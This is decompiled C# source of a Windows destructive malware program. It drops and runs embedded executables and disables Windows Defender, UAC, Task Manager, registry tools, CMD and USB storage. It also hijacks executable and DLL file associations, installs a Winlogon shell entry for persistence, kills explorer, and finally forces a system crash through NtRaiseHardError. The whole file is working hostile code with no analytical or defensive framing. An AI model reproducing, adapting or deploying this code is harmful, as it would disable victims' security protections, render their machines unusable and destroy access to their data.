using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

// Token: 0x02000002 RID: 2
public partial class deep : Form
{
	// Token: 0x06000019 RID: 25
	[DllImport("user32.dll")]
	private static extern bool SetCursorPos(int int_0, int int_1);

	// Token: 0x0600001A RID: 26
	[DllImport("ntdll.dll")]
	private static extern uint NtRaiseHardError(int int_0, uint uint_0, uint uint_1, IntPtr intptr_0, uint uint_2, out uint uint_3);

	// Token: 0x0600001B RID: 27
	[DllImport("ntdll.dll")]
	private static extern uint RtlAdjustPrivilege(int int_0, bool bool_0, bool bool_1, out bool bool_2);

	// Token: 0x0600001C RID: 28 RVA: 0x00002848 File Offset: 0x00000A48
	public deep()
	{
		this.InitializeComponent();
		string text = deep.smethod_1(deep.smethod_0(), ".tmp", ".exe");
		byte[] byte_ = Class2.Byte_2;
		FileStream fileStream = deep.smethod_2(text, FileMode.Create);
		try
		{
			deep.smethod_3(fileStream, byte_, 0, byte_.Length);
		}
		finally
		{
			if (fileStream != null)
			{
				deep.smethod_4(fileStream);
			}
		}
		deep.smethod_6(deep.smethod_5(text));
		deep.smethod_7(text);
		string text2 = deep.smethod_1(deep.smethod_0(), ".tmp", ".exe");
		byte[] byte_2 = Class2.Byte_3;
		FileStream fileStream2 = deep.smethod_2(text2, FileMode.Create);
		try
		{
			deep.smethod_3(fileStream2, byte_2, 0, byte_2.Length);
		}
		finally
		{
			if (fileStream2 != null)
			{
				deep.smethod_4(fileStream2);
			}
		}
		deep.smethod_0();
		string text3 = deep.smethod_9(deep.smethod_8(Environment.SpecialFolder.Windows), "cursor.cur");
		byte[] byte_3 = Class2.Byte_0;
		FileStream fileStream3 = deep.smethod_2(text3, FileMode.Create);
		try
		{
			deep.smethod_3(fileStream3, byte_3, 0, byte_3.Length);
		}
		finally
		{
			if (fileStream3 != null)
			{
				deep.smethod_4(fileStream3);
			}
		}
		RegistryKey registryKey = deep.smethod_10(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
		deep.smethod_11(registryKey, "NoChangingWallPaper", 1);
		deep.smethod_12(registryKey);
		RegistryKey registryKey2 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system");
		deep.smethod_11(registryKey2, "ConsentPromptBehaviorAdmin", 0);
		deep.smethod_12(registryKey2);
		RegistryKey registryKey3 = deep.smethod_10(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey3, "DisableTaskMgr", 1);
		deep.smethod_12(registryKey3);
		RegistryKey registryKey4 = deep.smethod_10(Registry.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey4, "DisableTaskMgr", 1);
		deep.smethod_12(registryKey4);
		RegistryKey registryKey5 = deep.smethod_10(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey5, "DisableRegistryTools", 1);
		deep.smethod_12(registryKey5);
		RegistryKey registryKey6 = deep.smethod_10(Registry.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey6, "DisableRegistryTools", 1);
		deep.smethod_12(registryKey6);
		RegistryKey registryKey7 = deep.smethod_10(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		deep.smethod_11(registryKey7, "NoWinKeys", 1);
		deep.smethod_12(registryKey7);
		RegistryKey registryKey8 = deep.smethod_10(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor");
		deep.smethod_11(registryKey8, "Start", 4);
		deep.smethod_12(registryKey8);
		RegistryKey registryKey9 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		deep.smethod_11(registryKey9, "DisableAntiSpyware", 1);
		deep.smethod_12(registryKey9);
		RegistryKey registryKey10 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		deep.smethod_11(registryKey10, "DisableAntiSpyware", 1);
		deep.smethod_12(registryKey10);
		RegistryKey registryKey11 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		deep.smethod_11(registryKey11, "DisableRoutinelyTakingAction", 1);
		deep.smethod_12(registryKey11);
		RegistryKey registryKey12 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey12, "WindowsDefenderMAJ", 1);
		deep.smethod_12(registryKey12);
		RegistryKey registryKey13 = deep.smethod_10(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey13, "WindowsDefenderMAJ", 1);
		deep.smethod_12(registryKey13);
		RegistryKey registryKey14 = deep.smethod_10(Registry.CurrentUser, "Control Panel\\Cursors");
		deep.smethod_11(registryKey14, "Arrow", "C:\\Windows\\cursor.cur");
		deep.smethod_11(registryKey14, "AppStarting", "C:\\Windows\\cursor.cur");
		deep.smethod_11(registryKey14, "Hand", "C:\\Windows\\cursor.cur");
		deep.smethod_12(registryKey14);
		RegistryKey registryKey15 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey15, "EnableLUA", 0);
		deep.smethod_12(registryKey15);
		RegistryKey registryKey16 = deep.smethod_10(Registry.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		deep.smethod_11(registryKey16, "NoControlPanel", 1);
		deep.smethod_12(registryKey16);
		RegistryKey registryKey17 = deep.smethod_10(Registry.CurrentUser, "Control Panel\\Cursors");
		deep.smethod_11(registryKey17, "SwapMouseButtons", "1");
		deep.smethod_12(registryKey17);
		RegistryKey registryKey18 = deep.smethod_10(Registry.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		deep.smethod_11(registryKey18, "NoRun", 1);
		deep.smethod_12(registryKey18);
		RegistryKey registryKey19 = deep.smethod_10(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		deep.smethod_11(registryKey19, "NoRun", 1);
		deep.smethod_12(registryKey19);
		RegistryKey registryKey20 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_13(registryKey20, "shutdownwithoutlogon", 0, RegistryValueKind.DWord);
		deep.smethod_12(registryKey20);
		RegistryKey registryKey21 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		deep.smethod_13(registryKey21, "AutoRestartShell", 0, RegistryValueKind.DWord);
		deep.smethod_12(registryKey21);
		RegistryKey registryKey22 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		deep.smethod_11(registryKey22, "UseDefaultTile", 1);
		deep.smethod_12(registryKey22);
		RegistryKey registryKey23 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		deep.smethod_11(registryKey23, "FilterAdministratorToken", 1);
		deep.smethod_12(registryKey23);
		RegistryKey registryKey24 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
		deep.smethod_11(registryKey24, "DisableRealtimeMonitoring", 1);
		deep.smethod_12(registryKey24);
		RegistryKey registryKey25 = deep.smethod_10(Registry.CurrentUser, "SYSTEM\\CurrentControlSet\\Services");
		deep.smethod_11(registryKey25, "USBSTOR", 4);
		deep.smethod_12(registryKey25);
		RegistryKey registryKey26 = deep.smethod_10(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services");
		deep.smethod_11(registryKey26, "USBSTOR", 4);
		deep.smethod_12(registryKey26);
		RegistryKey registryKey27 = deep.smethod_10(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor");
		deep.smethod_11(registryKey27, "Start", 4);
		deep.smethod_12(registryKey27);
		RegistryKey registryKey28 = deep.smethod_10(Registry.LocalMachine, "Software\\Microsoft\\Windows Script Host\\Settings");
		deep.smethod_11(registryKey28, "Enabled", 0);
		deep.smethod_12(registryKey28);
		RegistryKey registryKey29 = deep.smethod_10(Registry.CurrentUser, "Software\\Microsoft\\Windows Script Host\\Settings");
		deep.smethod_11(registryKey29, "Enabled", 0);
		deep.smethod_12(registryKey29);
		RegistryKey registryKey30 = deep.smethod_10(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows");
		deep.smethod_11(registryKey30, "DisableCMD", 2);
		deep.smethod_12(registryKey30);
		RegistryKey registryKey31 = deep.smethod_10(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System");
		deep.smethod_11(registryKey31, "DisableCMD", 2);
		deep.smethod_12(registryKey31);
		RegistryKey registryKey32 = deep.smethod_10(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\");
		deep.smethod_11(registryKey32, "DisableCMD", 2);
		deep.smethod_12(registryKey32);
		RegistryKey registryKey33 = deep.smethod_10(Registry.LocalMachine, "Software\\Policies\\Microsoft\\Windows");
		deep.smethod_11(registryKey33, "DisableCMD", 2);
		deep.smethod_12(registryKey33);
		RegistryKey registryKey34 = deep.smethod_10(Registry.LocalMachine, "Software\\Policies\\Microsoft\\Windows\\System");
		deep.smethod_11(registryKey34, "DisableCMD", 2);
		deep.smethod_12(registryKey34);
		RegistryKey registryKey35 = deep.smethod_10(Registry.LocalMachine, "Software\\Policies\\Microsoft\\Windows\\");
		deep.smethod_11(registryKey35, "DisableCMD", 2);
		deep.smethod_12(registryKey35);
		string text4 = deep.smethod_1(deep.smethod_0(), ".tmp", ".exe");
		byte[] byte_4 = Class2.Byte_1;
		FileStream fileStream4 = deep.smethod_2(text4, FileMode.Create);
		try
		{
			deep.smethod_3(fileStream4, byte_4, 0, byte_4.Length);
		}
		finally
		{
			if (fileStream4 != null)
			{
				deep.smethod_4(fileStream4);
			}
		}
		deep.smethod_6(deep.smethod_5(text4));
		deep.smethod_7(text4);
		RegistryKey registryKey36 = deep.smethod_10(Registry.ClassesRoot, "exefile\\shell\\open\\command");
		deep.smethod_13(registryKey36, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey36);
		RegistryKey registryKey37 = deep.smethod_10(Registry.ClassesRoot, "exefile\\shell\\runas\\command");
		deep.smethod_13(registryKey37, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey37);
		RegistryKey registryKey38 = deep.smethod_10(Registry.ClassesRoot, ".exe");
		deep.smethod_13(registryKey38, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey38);
		RegistryKey registryKey39 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Classes\\.sys");
		deep.smethod_13(registryKey39, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey39);
		RegistryKey registryKey40 = deep.smethod_10(Registry.ClassesRoot, "txtfilelegacy\\shell\\printto\\command");
		deep.smethod_13(registryKey40, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey40);
		RegistryKey registryKey41 = deep.smethod_10(Registry.ClassesRoot, "Classes\\.txt");
		deep.smethod_13(registryKey41, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey41);
		RegistryKey registryKey42 = deep.smethod_10(Registry.ClassesRoot, "Classes\\.dll");
		deep.smethod_13(registryKey42, "", "1", RegistryValueKind.String);
		deep.smethod_12(registryKey42);
		RegistryKey registryKey43 = deep.smethod_10(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		deep.smethod_11(registryKey43, "Shell", "explorer.exe, \"C:\\Windows\\No_place_to_stay.exe\"");
		deep.smethod_12(registryKey43);
		Process[] array = deep.smethod_14("explorer.exe");
		for (int i = 0; i < array.Length; i++)
		{
			deep.smethod_15(array[i]);
		}
		SoundPlayer soundPlayer = deep.smethod_16(Class2.UnmanagedMemoryStream_0);
		deep.smethod_17(soundPlayer);
		deep.smethod_18(soundPlayer);
		deep.smethod_19(this.timer_0, 3000);
		deep.smethod_20(this.timer_0, true);
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00003064 File Offset: 0x00001264
	protected virtual void WndProc(ref Message m)
	{
		if (m.Msg == 260)
		{
			if (m.WParam.ToInt32() == 115)
			{
				m.Result = IntPtr.Zero;
				return;
			}
		}
		base.WndProc(ref m);
	}

	// Token: 0x0600001E RID: 30 RVA: 0x000020CE File Offset: 0x000002CE
	private void pictureBox2_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600001F RID: 31 RVA: 0x000030A8 File Offset: 0x000012A8
	private void deep_Load(object sender, EventArgs e)
	{
		base.SetBounds((deep.smethod_22(deep.smethod_21()).Width - base.Width) / 2, (Screen.PrimaryScreen.Bounds.Height - base.Height) / 2, base.Width, base.Height);
	}

	// Token: 0x06000020 RID: 32 RVA: 0x000020D0 File Offset: 0x000002D0
	private void method_0(object sender, EventArgs e)
	{
		deep.smethod_23(this.pictureBox2, Class2.Bitmap_0);
		deep.smethod_20(this.timer_0, false);
		deep.smethod_19(this.timer_1, 3000);
		deep.smethod_20(this.timer_1, true);
	}

	// Token: 0x06000021 RID: 33 RVA: 0x0000210A File Offset: 0x0000030A
	private void timer_1_Tick(object sender, EventArgs e)
	{
		deep.smethod_23(this.pictureBox2, Class2.Bitmap_1);
		deep.smethod_20(this.timer_1, false);
		deep.smethod_19(this.timer_2, 3000);
		deep.smethod_20(this.timer_2, true);
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00002144 File Offset: 0x00000344
	private void timer_2_Tick(object sender, EventArgs e)
	{
		deep.smethod_23(this.pictureBox2, Class2.Bitmap_2);
		deep.smethod_20(this.timer_2, false);
		deep.smethod_19(this.timer_3, 3000);
		deep.smethod_20(this.timer_3, true);
	}

	// Token: 0x06000023 RID: 35 RVA: 0x0000217E File Offset: 0x0000037E
	private void timer_3_Tick(object sender, EventArgs e)
	{
		deep.smethod_23(this.pictureBox2, Class2.Bitmap_3);
		deep.smethod_20(this.timer_3, false);
		deep.smethod_19(this.timer_4, 3000);
		deep.smethod_20(this.timer_4, true);
	}

	// Token: 0x06000024 RID: 36 RVA: 0x00003100 File Offset: 0x00001300
	private void timer_4_Tick(object sender, EventArgs e)
	{
		deep.smethod_23(this.pictureBox2, Class2.Bitmap_5);
		deep.smethod_24(new msgbox());
		deep.smethod_20(this.timer_4, false);
		int num = -1073741790;
		bool flag;
		deep.RtlAdjustPrivilege(19, true, false, out flag);
		uint num2;
		deep.NtRaiseHardError(num, 0U, 0U, IntPtr.Zero, 6U, out num2);
	}

	// Token: 0x06000025 RID: 37 RVA: 0x000020CE File Offset: 0x000002CE
	private void timer_5_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x06000026 RID: 38 RVA: 0x000021B8 File Offset: 0x000003B8
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			deep.smethod_4(this.icontainer_0);
		}
		base.Dispose(disposing);
	}

	// Token: 0x06000028 RID: 40 RVA: 0x000021D7 File Offset: 0x000003D7
	static string smethod_0()
	{
		return Path.GetTempFileName();
	}

	// Token: 0x06000029 RID: 41 RVA: 0x000021DE File Offset: 0x000003DE
	static string smethod_1(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	// Token: 0x0600002A RID: 42 RVA: 0x000021E8 File Offset: 0x000003E8
	static FileStream smethod_2(string string_0, FileMode fileMode_0)
	{
		return new FileStream(string_0, fileMode_0);
	}

	// Token: 0x0600002B RID: 43 RVA: 0x000021F1 File Offset: 0x000003F1
	static void smethod_3(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	// Token: 0x0600002C RID: 44 RVA: 0x000021FC File Offset: 0x000003FC
	static void smethod_4(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00002204 File Offset: 0x00000404
	static Process smethod_5(string string_0)
	{
		return Process.Start(string_0);
	}

	// Token: 0x0600002E RID: 46 RVA: 0x0000220C File Offset: 0x0000040C
	static void smethod_6(Process process_0)
	{
		process_0.WaitForExit();
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00002214 File Offset: 0x00000414
	static void smethod_7(string string_0)
	{
		File.Delete(string_0);
	}

	// Token: 0x06000030 RID: 48 RVA: 0x0000221C File Offset: 0x0000041C
	static string smethod_8(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00002224 File Offset: 0x00000424
	static string smethod_9(string string_0, string string_1)
	{
		return Path.Combine(string_0, string_1);
	}

	// Token: 0x06000032 RID: 50 RVA: 0x0000222D File Offset: 0x0000042D
	static RegistryKey smethod_10(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.CreateSubKey(string_0);
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00002236 File Offset: 0x00000436
	static void smethod_11(RegistryKey registryKey_0, string string_0, object object_0)
	{
		registryKey_0.SetValue(string_0, object_0);
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00002240 File Offset: 0x00000440
	static void smethod_12(RegistryKey registryKey_0)
	{
		registryKey_0.Dispose();
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00002248 File Offset: 0x00000448
	static void smethod_13(RegistryKey registryKey_0, string string_0, object object_0, RegistryValueKind registryValueKind_0)
	{
		registryKey_0.SetValue(string_0, object_0, registryValueKind_0);
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00002253 File Offset: 0x00000453
	static Process[] smethod_14(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	// Token: 0x06000037 RID: 55 RVA: 0x0000225B File Offset: 0x0000045B
	static void smethod_15(Process process_0)
	{
		process_0.Kill();
	}

	// Token: 0x06000038 RID: 56 RVA: 0x00002263 File Offset: 0x00000463
	static SoundPlayer smethod_16(Stream stream_0)
	{
		return new SoundPlayer(stream_0);
	}

	// Token: 0x06000039 RID: 57 RVA: 0x0000226B File Offset: 0x0000046B
	static void smethod_17(SoundPlayer soundPlayer_0)
	{
		soundPlayer_0.Load();
	}

	// Token: 0x0600003A RID: 58 RVA: 0x00002273 File Offset: 0x00000473
	static void smethod_18(SoundPlayer soundPlayer_0)
	{
		soundPlayer_0.PlayLooping();
	}

	// Token: 0x0600003B RID: 59 RVA: 0x0000227B File Offset: 0x0000047B
	static void smethod_19(Timer timer_6, int int_0)
	{
		timer_6.Interval = int_0;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00002284 File Offset: 0x00000484
	static void smethod_20(Timer timer_6, bool bool_0)
	{
		timer_6.Enabled = bool_0;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x0000228D File Offset: 0x0000048D
	static Screen smethod_21()
	{
		return Screen.PrimaryScreen;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x00002294 File Offset: 0x00000494
	static Rectangle smethod_22(Screen screen_0)
	{
		return screen_0.Bounds;
	}

	// Token: 0x0600003F RID: 63 RVA: 0x0000229C File Offset: 0x0000049C
	static void smethod_23(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.Image = image_0;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x000022A5 File Offset: 0x000004A5
	static void smethod_24(Control control_0)
	{
		control_0.Show();
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000022AD File Offset: 0x000004AD
	static Container smethod_25()
	{
		return new Container();
	}

	// Token: 0x06000042 RID: 66 RVA: 0x000022B4 File Offset: 0x000004B4
	static Timer smethod_26(IContainer icontainer_1)
	{
		return new Timer(icontainer_1);
	}

	// Token: 0x06000043 RID: 67 RVA: 0x000022BC File Offset: 0x000004BC
	static PictureBox smethod_27()
	{
		return new PictureBox();
	}

	// Token: 0x06000044 RID: 68 RVA: 0x000022C3 File Offset: 0x000004C3
	static void smethod_28(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	// Token: 0x06000045 RID: 69 RVA: 0x000022CB File Offset: 0x000004CB
	static void smethod_29(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x06000046 RID: 70 RVA: 0x000022D3 File Offset: 0x000004D3
	static void smethod_30(Timer timer_6, EventHandler eventHandler_0)
	{
		timer_6.Tick += eventHandler_0;
	}
}
